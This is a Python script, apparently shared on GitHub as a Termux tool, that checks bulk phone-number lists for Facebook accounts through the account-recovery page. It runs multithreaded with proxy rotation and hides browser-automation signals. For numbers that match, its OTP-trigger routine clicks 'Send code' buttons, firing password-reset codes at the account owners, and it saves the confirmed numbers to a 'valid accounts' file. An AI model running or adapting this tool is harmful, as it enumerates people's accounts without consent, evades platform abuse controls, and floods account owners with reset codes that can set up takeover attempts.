#!/usr/bin/env python3
"""
🔥 FB PHONE CHECKER - Termux Edition v2.0
Multi-thread + Proxy Rotation + OTP Trigger
Worldwide phone number support

Author: cybersecuritybhau-maker
GitHub: https://github.com/cybersecuritybhau-maker/fb_checker

Install:
    pkg update -y && pkg upgrade -y
    pkg install python chromium -y
    pip install selenium webdriver-manager phonenumbers

Usage:
    python fb_checker.py
"""

import os
import sys
import json
import re
import time
import random
import threading
import queue as queue_module
from datetime import datetime
from typing import List, Dict, Optional, Tuple

# ==================== MODULE CHECK ====================

REQUIRED_MODULES = {
    "selenium": "selenium",
    "webdriver_manager": "webdriver-manager",
    "phonenumbers": "phonenumbers"
}

missing = []
for mod_name, pip_name in REQUIRED_MODULES.items():
    try:
        __import__(mod_name)
    except ImportError:
        missing.append(pip_name)

if missing:
    print(f"❌ Missing modules: {', '.join(missing)}")
    print(f"   Run: pip install {' '.join(missing)}")
    sys.exit(1)

import phonenumbers
from phonenumbers import geocoder, carrier
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# ==================== CONFIGURATION ====================

VERSION = "2.0"
CONFIG = {
    "max_threads": 5,
    "delay": 2,
    "timeout": 15,
    "headless": True,
    "results_file": "fb_results.json",
    "valid_file": "valid_fb_accounts.txt",
    "proxy_file": "proxies.txt",
    "numbers_file": "numbers.txt"
}

# User agents rotation
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; OnePlus 9) AppleWebKit/537.36",
]

# ==================== PROXY MANAGER ====================

class ProxyManager:
    """Manage proxy rotation"""
    
    def __init__(self):
        self.proxies: List[str] = []
        self._lock = threading.Lock()
        self._index = 0
        self.load_from_file()
    
    def load_from_file(self) -> int:
        """Load proxies from file"""
        self.proxies.clear()
        
        if os.path.exists(CONFIG["proxy_file"]):
            try:
                with open(CONFIG["proxy_file"], "r") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            self.proxies.append(line)
                print(f"📂 Loaded {len(self.proxies)} proxies from {CONFIG['proxy_file']}")
            except Exception as e:
                print(f"⚠️ Error loading proxies: {e}")
        
        # Default proxies if empty
        if not self.proxies:
            self.proxies = [
                "http://103.153.154.110:80",
                "http://103.174.102.127:80",
                "http://47.74.135.104:8888",
                "http://103.152.232.107:80",
                "http://103.152.112.122:80",
            ]
            print(f"📂 Using {len(self.proxies)} default proxies")
        
        return len(self.proxies)
    
    def get_next(self) -> Optional[str]:
        """Get next proxy (round-robin)"""
        if not self.proxies:
            return None
        with self._lock:
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
            return proxy
    
    def add(self, proxy: str):
        """Add proxy at runtime"""
        with self._lock:
            self.proxies.append(proxy)
            try:
                with open(CONFIG["proxy_file"], "a") as f:
                    f.write(f"{proxy}\n")
            except:
                pass
            print(f"✅ Proxy added: {proxy}")
    
    def remove(self, index: int) -> bool:
        """Remove proxy by index"""
        with self._lock:
            if 0 <= index < len(self.proxies):
                removed = self.proxies.pop(index)
                print(f"🗑️ Removed proxy: {removed}")
                return True
            return False
    
    def test(self, proxy: str) -> bool:
        """Test if proxy works"""
        try:
            import requests
            r = requests.get(
                "http://httpbin.org/ip",
                proxies={"http": proxy, "https": proxy},
                timeout=5
            )
            return r.status_code == 200
        except:
            return False
    
    def count(self) -> int:
        return len(self.proxies)
    
    def display(self):
        """Display all proxies"""
        if not self.proxies:
            print("❌ No proxies configured!")
            print("   Add to proxies.txt or use option 3")
            return
        
        print(f"\n{'='*50}")
        print(f"🔌 Proxy List ({len(self.proxies)} proxies)")
        print(f"{'='*50}")
        
        for i, p in enumerate(self.proxies, 1):
            status = "✅" if self.test(p) else "⚠️"
            print(f"  {i:2d}. {status} {p}")
        
        print(f"{'='*50}")

# ==================== PHONE NORMALIZER ====================

class PhoneNormalizer:
    """Normalize worldwide phone numbers"""
    
    COUNTRY_PATTERNS = [
        (r'^\+?8801\d{9}$', 'BD', 'Bangladesh'),
        (r'^\+?1\d{10}$', 'US', 'USA/Canada'),
        (r'^\+?44\d{10}$', 'GB', 'United Kingdom'),
        (r'^\+?91\d{10}$', 'IN', 'India'),
        (r'^\+?92\d{10}$', 'PK', 'Pakistan'),
        (r'^\+?971\d{9}$', 'AE', 'UAE'),
        (r'^\+?966\d{9}$', 'SA', 'Saudi Arabia'),
        (r'^\+?971\d{9}$', 'AE', 'UAE'),
        (r'^\+?8801\d{9}$', 'BD', 'Bangladesh'),
    ]
    
    @staticmethod
    def normalize(phone: str) -> Optional[str]:
        """
        Normalize phone number to E.164 format
        Returns None if invalid
        """
        # Remove all non-digit except +
        phone = re.sub(r'[^\d+]', '', phone)
        
        # Try phonenumbers library first
        try:
            parsed = phonenumbers.parse(phone)
            if phonenumbers.is_valid_number(parsed):
                formatted = phonenumbers.format_number(
                    parsed, phonenumbers.PhoneNumberFormat.E164
                )
                return formatted
        except:
            pass
        
        # Manual normalization patterns
        # Bangladesh: 01XXXXXXXXX -> +8801XXXXXXXXX
        if re.match(r'^01\d{9}$', phone):
            return f"+88{phone}"
        
        # USA: 1XXXXXXXXXX -> +1XXXXXXXXXX
        if re.match(r'^1\d{10}$', phone):
            return f"+{phone}"
        
        # UK: 07XXXXXXXXX -> +447XXXXXXXXX
        if re.match(r'^07\d{9}$', phone):
            return f"+44{phone[1:]}"
        
        # India: 9XXXXXXXXX -> +919XXXXXXXXX
        if re.match(r'^[6-9]\d{9}$', phone):
            return f"+91{phone}"
        
        # Already has + prefix
        if phone.startswith('+') and len(phone) >= 8 and len(phone) <= 15:
            return phone
        
        # 10 digit number (default to BD with 88)
        if len(phone) == 10:
            return f"+88{phone}"
        
        return None
    
    @staticmethod
    def get_country(phone: str) -> str:
        """Get country name from phone"""
        try:
            parsed = phonenumbers.parse(phone)
            return geocoder.description_for_number(parsed, "en")
        except:
            return "Unknown"
    
    @staticmethod
    def get_carrier(phone: str) -> str:
        """Get carrier name"""
        try:
            parsed = phonenumbers.parse(phone)
            return carrier.name_for_number(parsed, "en")
        except:
            return "Unknown"

# ==================== FACEBOOK CHECKER ====================

class FacebookChecker:
    """Check Facebook account by phone number"""
    
    FB_IDENTIFY_URL = "https://www.facebook.com/login/identify/"
    
    VALID_SIGNALS = [
        "continue", "নিশ্চিত করুন", "send code", "কোড পাঠান",
        "password", "পাসওয়ার্ড", "code", "কোড", "reset",
        "রিসেট", "রিসেট করুন", "confirm identity", "enter code",
        "enter the code", "কোড লিখুন", "new password",
    ]
    
    INVALID_SIGNALS = [
        "no account found", "অ্যাকাউন্ট পাওয়া যায়নি",
        "couldn't find", "not found", "খুঁজে পাওয়া যায়নি",
        "no search results", "কোন ফলাফল নেই",
    ]
    
    OTP_BUTTONS = [
        "//button[contains(text(), 'Continue')]",
        "//button[contains(text(), 'নিশ্চিত')]",
        "//button[contains(text(), 'Send')]",
        "//button[contains(text(), 'কোড')]",
        "//button[contains(text(), 'পাঠান')]",
        "//button[contains(text(), 'Submit')]",
        "//button[contains(text(), 'জমা')]",
        "//div[@role='button']//span[contains(text(), 'Continue')]",
        "//div[@role='button']//span[contains(text(), 'নিশ্চিত')]",
    ]
    
    def __init__(self, proxy_manager: ProxyManager, thread_id: int):
        self.proxy_manager = proxy_manager
        self.thread_id = thread_id
        self.stats = {"checked": 0, "valid": 0, "errors": 0}
    
    def _create_driver(self) -> webdriver.Chrome:
        """Create Chrome WebDriver instance"""
        options = Options()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-notifications")
        options.add_argument("--disable-popup-blocking")
        options.add_argument(f"--user-agent={random.choice(USER_AGENTS)}")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option("useAutomationExtension", False)
        
        if CONFIG.get("headless", True):
            options.add_argument("--headless")
        
        proxy = self.proxy_manager.get_next()
        if proxy:
            options.add_argument(f"--proxy-server={proxy}")
        
        try:
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
            driver.execute_script(
                "Object.defineProperty(navigator, 'webdriver', "
                "{get: () => undefined})"
            )
            return driver
        except Exception as e:
            raise RuntimeError(f"Failed to create driver: {e}")
    
    def check(self, phone: str) -> Dict:
        """
        Check if phone has Facebook account
        Returns result dict
        """
        result = {
            "phone": phone,
            "country": PhoneNormalizer.get_country(phone),
            "carrier": PhoneNormalizer.get_carrier(phone),
            "status": "PENDING",
            "proxy": None,
            "thread": self.thread_id,
            "timestamp": datetime.now().isoformat()
        }
        
        driver = None
        try:
            driver = self._create_driver()
            result["proxy"] = driver.capabilities.get("proxy", {}).get("httpProxy", "None")
            
            # Step 1: Go to Facebook
            driver.get(self.FB_IDENTIFY_URL)
            time.sleep(2 + random.random() * 2)
            
            # Step 2: Enter phone
            phone_input = WebDriverWait(driver, CONFIG["timeout"]).until(
                EC.presence_of_element_located((By.NAME, "phone_number"))
            )
            phone_input.clear()
            phone_input.send_keys(phone)
            
            # Step 3: Click search
            search_btn = driver.find_element(By.NAME, "did_submit")
            search_btn.click()
            time.sleep(3 + random.random() * 2)
            
            # Step 4: Analyze response
            page_text = driver.page_source.lower()
            
            # Check for invalid first
            if any(sig in page_text for sig in self.INVALID_SIGNALS):
                result["status"] = "❌ NO ACCOUNT"
            elif any(sig in page_text for sig in self.VALID_SIGNALS):
                # Account found! Try OTP
                result = self._trigger_otp(driver, result)
            else:
                # Ambiguous - could be blocked or no result
                result["status"] = "⚠️ UNKNOWN"
            
            self.stats["checked"] += 1
            if "VALID" in result["status"]:
                self.stats["valid"] += 1
            elif "ERROR" in result["status"]:
                self.stats["errors"] += 1
        
        except Exception as e:
            result["status"] = f"⚠️ ERROR: {str(e)[:60]}"
            self.stats["errors"] += 1
        
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
        
        return result
    
    def _trigger_otp(self, driver: webdriver.Chrome, result: Dict) -> Dict:
        """Try to trigger OTP send"""
        for btn_xpath in self.OTP_BUTTONS:
            try:
                otp_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, btn_xpath))
                )
                driver.execute_script("arguments[0].click();", otp_btn)
                time.sleep(2)
                
                # Check if OTP was sent
                page_text = driver.page_source.lower()
                if any(x in page_text for x in ["code sent", "কোড পাঠানো", "sent", "পাঠানো"]):
                    result["status"] = "✅ VALID - OTP SENT ✅"
                else:
                    result["status"] = "✅ VALID - ACCOUNT FOUND"
                
                return result
            except:
                continue
        
        result["status"] = "✅ VALID - ACCOUNT FOUND"
        return result

# ==================== MAIN APPLICATION ====================

class FBCheckerApp:
    """Main application controller"""
    
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.phone_queue = queue_module.Queue()
        self.results: List[Dict] = []
        self.total_checked = 0
        self.total_valid = 0
        self.start_time = None
        self.is_running = False
        self._lock = threading.Lock()
        self._checkers: List[FacebookChecker] = []
    
    def add_numbers_manual(self, text: str) -> int:
        """Add manually entered numbers"""
        count = 0
        for part in re.split(r'[,;\n\s]+', text):
            part = part.strip()
            if not part:
                continue
            phone = PhoneNormalizer.normalize(part)
            if phone:
                self.phone_queue.put(phone)
                count += 1
            else:
                print(f"⚠️ Invalid number skipped: {part}")
        return count
    
    def load_numbers_from_file(self, filename: str = None) -> int:
        """Load numbers from file"""
        if not filename:
            filename = CONFIG["numbers_file"]
        
        if not os.path.exists(filename):
            print(f"❌ File not found: {filename}")
            return 0
        
        count = 0
        try:
            with open(filename, "r") as f:
                for line in f:
                    phone = PhoneNormalizer.normalize(line.strip())
                    if phone:
                        self.phone_queue.put(phone)
                        count += 1
            print(f"📂 Loaded {count} numbers from {filename}")
        except Exception as e:
            print(f"⚠️ Error reading file: {e}")
        
        return count
    
    def _worker(self, thread_id: int):
        """Worker thread function"""
        checker = FacebookChecker(self.proxy_manager, thread_id)
        self._checkers.append(checker)
        
        while self.is_running and not self.phone_queue.empty():
            try:
                phone = self.phone_queue.get_nowait()
            except queue_module.Empty:
                break
            
            result = checker.check(phone)
            
            with self._lock:
                self.results.append(result)
                self.total_checked += 1
                if "VALID" in result["status"]:
                    self.total_valid += 1
                    self._save_valid_instant(result)
                
                # Show progress
                if self.total_checked % 3 == 0 or "VALID" in result["status"]:
                    self._show_progress()
            
            # Auto-save
            if self.total_checked % 20 == 0:
                self.save_results()
            
            # Delay
            time.sleep(CONFIG.get("delay", 2))
    
    def _show_progress(self):
        """Display current progress"""
        elapsed = time.time() - self.start_time
        rate = self.total_checked / elapsed if elapsed > 0 else 0
        remaining = self.phone_queue.qsize()
        eta = remaining / rate if rate > 0 else 0
        
        print(
            f"\r[{datetime.now().strftime('%H:%M:%S')}] "
            f"📊 Checked: {self.total_checked} "
            f"✅ Valid: {self.total_valid} "
            f"⏳ Queue: {remaining} "
            f"⚡ {rate:.1f}/s "
            f"⏱️ ETA: {eta:.0f}s      ",
            end="", flush=True
        )
    
    def _save_valid_instant(self, result: Dict):
        """Save valid account immediately"""
        try:
            line = (
                f"{result['phone']} | "
                f"{result['country']} | "
                f"{result['carrier']} | "
                f"{result['status']} | "
                f"{result['timestamp']}\n"
            )
            with open(CONFIG["valid_file"], "a") as f:
                f.write(line)
        except:
            pass
    
    def start(self, threads: int = None):
        """Start checking"""
        if self.phone_queue.empty():
            print("❌ No numbers in queue!")
            return False
        
        if not threads:
            threads = CONFIG.get("max_threads", 5)
        
        threads = max(1, min(threads, 20))
        
        self.is_running = True
        self.start_time = time.time()
        
        total_numbers = self.phone_queue.qsize()
        
        print(f"\n{'='*55}")
        print(f"🚀 STARTING FB PHONE CHECKER v{VERSION}")
        print(f"{'='*55}")
        print(f"📱 Numbers: {total_numbers}")
        print(f"🧵 Threads: {threads}")
        print(f"🔌 Proxies: {self.proxy_manager.count()}")
        print(f"⏱️  Delay: {CONFIG.get('delay', 2)}s")
        print(f"📁 Results: {CONFIG['results_file']}")
        print(f"📁 Valid: {CONFIG['valid_file']}")
        print(f"{'='*55}\n")
        
        # Start threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=self._worker, args=(i+1,), daemon=True)
            t.start()
            thread_list.append(t)
        
        try:
            for t in thread_list:
                t.join()
        except KeyboardInterrupt:
            print("\n\n🛑 Keyboard interrupt received. Stopping...")
            self.is_running = False
        
        self.is_running = False
        self.save_results()
        
        elapsed = time.time() - self.start_time
        rate = self.total_checked / elapsed if elapsed > 0 else 0
        
        print(f"\n\n{'='*55}")
        print(f"✅ COMPLETE!")
        print(f"{'='*55}")
        print(f"📊 Total checked: {self.total_checked}")
        print(f"✅ Valid found: {self.total_valid}")
        print(f"⏱️  Time: {elapsed:.1f}s")
        print(f"⚡ Speed: {rate:.1f}/s")
        print(f"{'='*55}")
        
        # Show valid accounts
        if self.total_valid > 0:
            print(f"\n🎯 VALID ACCOUNTS:")
            print(f"{'='*55}")
            for r in self.results:
                if "VALID" in r["status"]:
                    print(f"  ✅ {r['phone']} | {r['country']} | {r['status']}")
        
        return True
    
    def save_results(self):
        """Save all results to file"""
        try:
            # Full results
            output = {
                "metadata": {
                    "version": VERSION,
                    "timestamp": datetime.now().isoformat(),
                    "total_checked": self.total_checked,
                    "total_valid": self.total_valid,
                    "proxies": self.proxy_manager.count()
                },
                "results": self.results
            }
            with open(CONFIG["results_file"], "w") as f:
                json.dump(output, f, indent=2, ensure_ascii=False)
            
            # Valid accounts summary
            valid = [r for r in self.results if "VALID" in r["status"]]
            if valid:
                with open(CONFIG["valid_file"], "w") as f:
                    f.write(f"# FB Phone Checker v{VERSION} - Valid Accounts\n")
                    f.write(f"# Generated: {datetime.now().isoformat()}\n")
                    f.write(f"# Total: {len(valid)}\n")
                    f.write(f"{'='*70}\n\n")
                    for r in valid:
                        f.write(
                            f"{r['phone']} | {r['country']} | {r['carrier']} | "
                            f"{r['status']} | {r['timestamp']}\n"
                        )
            
            print(f"\n💾 Results saved to {CONFIG['results_file']}")
            print(f"💾 Valid accounts saved to {CONFIG['valid_file']}")
        
        except Exception as e:
            print(f"⚠️ Error saving results: {e}")

# ==================== UI ====================

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(f"""
    ╔═══════════════════════════════════════╗
    ║   🔥 FB PHONE CHECKER v{VERSION}          ║
    ║   Termux Edition                      ║
    ║   Multi-Thread + Proxy Rotation       ║
    ║   Author: cybersecuritybhau-maker      ║
    ╚═══════════════════════════════════════╝
    """)

def show_menu():
    print("""
╔══════════════════════════════════════════╗
║              MAIN MENU                   ║
╠══════════════════════════════════════════╣
║  1. 📱  Add numbers (manual)            ║
║  2. 📂  Load numbers from file          ║
║  3. 🔌  Proxy management                ║
║  4. 🚀  Start checking                  ║
║  5. 📊  View results                    ║
║  6. 💾  Save & export results           ║
║  7. ⚙️   Settings                       ║
║  0. ❌  Exit                            ║
╚══════════════════════════════════════════╝
    """)

def manage_proxies(proxy_manager: ProxyManager):
    """Proxy management menu"""
    while True:
        banner()
        print("🔌 PROXY MANAGEMENT\n")
        print("  1. Show all proxies")
        print("  2. Add proxy")
        print("  3. Test proxy")
        print("  4. Remove proxy")
        print("  5. Reload from file")
        print("  0. Back to main menu")
        
        choice = input("\n👉 Select: ").strip()
        
        if choice == "1":
            proxy_manager.display()
        elif choice == "2":
            proxy = input("🔌 Enter proxy (http://IP:PORT): ").strip()
            if proxy:
                proxy_manager.add(proxy)
        elif choice == "3":
            proxy = input("🔌 Enter proxy to test: ").strip()
            if proxy:
                print("   Testing..." if proxy_manager.test(proxy) else "   Failed!")
        elif choice == "4":
            try:
                idx = int(input("🔌 Enter proxy number to remove: ")) - 1
                proxy_manager.remove(idx)
            except:
                print("❌ Invalid number!")
        elif choice == "5":
            proxy_manager.load_from_file()
        elif choice == "0":
            break
        
        input("\nPress Enter to continue...")

def configure(app: FBCheckerApp):
    """Settings menu"""
    banner()
    print("⚙️ SETTINGS\n")
    print(f"  Current threads: {CONFIG['max_threads']}")
    print(f"  Current delay: {CONFIG['delay']}s")
    print(f"  Headless mode: {CONFIG['headless']}")
    print(f"  Results file: {CONFIG['results_file']}")
    print(f"  Proxy file: {CONFIG['proxy_file']}")
    print(f"  Numbers file: {CONFIG['numbers_file']}")
    
    try:
        t = input(f"\n📊 Threads (1-20, default {CONFIG['max_threads']}): ").strip()
        if t:
            CONFIG['max_threads'] = max(1, min(int(t), 20))
    except:
        pass
    
    try:
        d = input(f"⏱️  Delay seconds (default {CONFIG['delay']}): ").strip()
        if d:
            CONFIG['delay'] = max(0.5, float(d))
    except:
        pass

def setup_config_files():
    """Create config files if missing"""
    if not os.path.exists(CONFIG["proxy_file"]):
        with open(CONFIG["proxy_file"], "w") as f:
            f.write("# FB Checker Proxy List\n")
            f.write("# Format: http://IP:PORT or http://user:pass@IP:PORT\n\n")
            f.write("http://103.153.154.110:80\n")
            f.write("http://103.174.102.127:80\n")
            f.write("http://47.74.135.104:8888\n")
            f.write("http://103.152.232.107:80\n")
        print(f"📁 Created {CONFIG['proxy_file']} with default proxies")
    
    if not os.path.exists(CONFIG["numbers_file"]):
        with open(CONFIG["numbers_file"], "w") as f:
            f.write("# FB Checker Phone Numbers\n")
            f.write("# Add numbers here (one per line)\n\n")
            f.write("+8801712345678\n")
            f.write("+8801912345678\n")
            f.write("+12025550123\n")

# ==================== MAIN ====================

def main():
    setup_config_files()
    app = FBCheckerApp()
    
    while True:
        banner()
        show_menu()
        choice = input("👉 Select option: ").strip()
        
        if choice == "1":
            banner()
            print("📱 Enter phone numbers (comma or space separated):")
            print("   Examples:")
            print("     +8801712345678,+8801912345678,+12025550123")
            print("     +447123456789 +919876543210\n")
            
            numbers = input("📱 Numbers: ").strip()
            if numbers:
                count = app.add_numbers_manual(numbers)
                print(f"\n✅ {count} numbers added to queue!")
            else:
                print("❌ No numbers entered!")
            
            input("\nPress Enter to continue...")
        
        elif choice == "2":
            banner()
            print(f"📂 Load from file (default: {CONFIG['numbers_file']})")
            filename = input("📂 Enter filename (or Enter for default): ").strip()
            
            if not filename:
                filename = CONFIG["numbers_file"]
            
            count = app.load_numbers_from_file(filename)
            if count > 0:
                print(f"✅ {count} numbers loaded from {filename}")
            
            input("\nPress Enter to continue...")
        
        elif choice == "3":
            manage_proxies(app.proxy_manager)
        
        elif choice == "4":
            banner()
            if app.phone_queue.empty():
                print("❌ No numbers in queue!")
                print("   Add numbers first (option 1 or 2)")
                input("\nPress Enter to continue...")
                continue
            
            try:
                threads = input(f"🧵 Threads (default {CONFIG['max_threads']}): ").strip()
                threads = int(threads) if threads else CONFIG['max_threads']
            except:
                threads = CONFIG['max_threads']
            
            app.start(threads=threads)
            input("\nPress Enter to continue...")
        
        elif choice == "5":
            banner()
            print("📊 RESULTS\n")
            print(f"📱 Total checked: {app.total_checked}")
            print(f"✅ Valid accounts: {app.total_valid}")
            print(f"❌ Queue remaining: {app.phone_queue.qsize()}\n")
            
            if app.results:
                valid = [r for r in app.results if "VALID" in r["status"]]
                if valid:
                    print(f"🎯 VALID ACCOUNTS ({len(valid)}):")
                    print("-" * 50)
                    for r in valid[:20]:
                        print(f"  ✅ {r['phone']} | {r['country']} | {r['status']}")
                    if len(valid) > 20:
                        print(f"  ... and {len(valid)-20} more")
                    print("-" * 50)
                else:
                    print("❌ No valid accounts found yet")
            
            input("\nPress Enter to continue...")
        
        elif choice == "6":
            app.save_results()
            input("\nPress Enter to continue...")
        
        elif choice == "7":
            configure(app)
            input("\nPress Enter to continue...")
        
        elif choice == "0":
            print("\n👋 Exiting...")
            break
        
        else:
            print("❌ Invalid option!")
            input("Press Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n🛑 Interrupted by user.")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()
